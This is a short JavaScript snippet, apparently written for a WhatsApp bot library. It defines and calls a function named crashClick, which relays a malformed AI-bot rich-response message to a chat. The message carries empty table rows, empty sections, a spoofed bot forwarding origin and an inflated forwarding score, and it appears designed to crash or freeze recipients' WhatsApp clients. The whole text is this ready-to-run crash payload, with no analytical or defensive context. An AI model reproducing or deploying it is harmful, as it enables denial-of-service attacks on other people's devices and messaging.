const crashClick = (sock, m) => {
  sock.relayMessage(
    m.chat,
    {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2,
        botMetadata: {
          pluginMetadata: {},
          richResponseSourcesMetadata: {
            sources: []
          }
        }
      },
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [
              {
                messageType: 2,
                messageText: "hai"
              },
              {
                messageType: 4,
                tableMetadata: {
                  title: "",
                  rows: [
                    { items: [], isHeading: true },
                    { items: [] },
                    { items: [] }
                  ]
                }
              }
            ],
            unifiedResponse: {
              data: JSON.stringify({
                response_id: crypto.randomUUID(),
                sections: []
              })
            },
            contextInfo: {
              forwardingScore: 999,
              isForwarded: true,
              forwardedAiBotMessageInfo: {
                botJid: "867051314767696@bot"
              },
              forwardOrigin: 4
            }
          }
        }
      }
    },
    {
      messageId: "qilaKeepstrong" + Date.now()
    }
  )
}

crashClick(sock, m)